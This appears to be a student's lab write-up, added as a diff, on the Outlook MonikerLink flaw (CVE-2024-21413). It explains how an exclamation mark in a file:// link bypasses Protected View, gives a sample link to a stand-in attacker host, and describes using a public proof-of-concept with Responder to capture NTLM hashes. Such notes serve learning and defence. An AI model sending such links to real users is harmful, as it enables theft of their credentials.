@@ -1,0 +1,39 @@
+moniker link = old Windows type of hyperlink for locating object/files across a network
+They were very vulnerable
+Outlook has "Protected View", which:
+- opens emails in read-only mode, 
+- which should in theory prevent attacks, but...
+
+By including an exclamation mark in a hyperlink, Protected View is bypassed
+
+# file:// tells outlook to acces a file
+# the exclamation mark messes with Protected View
+file://ATTACKER/test!exploit
+
+_______________________________________
+Proof of Concept
+
+We tested a PoC by CMNatic, https://github.com/CMNatic/CVE-2024-21413
+
+we tried this with a tool called responder at attacker (for listening)
+
+we copied and replaced placeholders of CMNatics exploit.py
+then ran the exploit.py, sending the mail
+
+*** A small but big problem the lab didn't tell us about ***
+there was a process running on port 445 - the one that SMB uses.
+This meant that we couldn't listen on that port,
+even though everything was correct, we got nothing in responder, 
+up until we decided to kill the process with:
+sudo systemctl stop smbd nmbd vnmbd 2>/dev/null
+
+on the target we clicked on the link in outlook 
+and it showed us an error that some file was not found
+but the exploit worked.
+In responder we got the hashes.
+
+_______________________________________
+Remediation
+
+dont'click random stuff and don't interact with suspicious emails (duh)
++update your outlook and stuff.
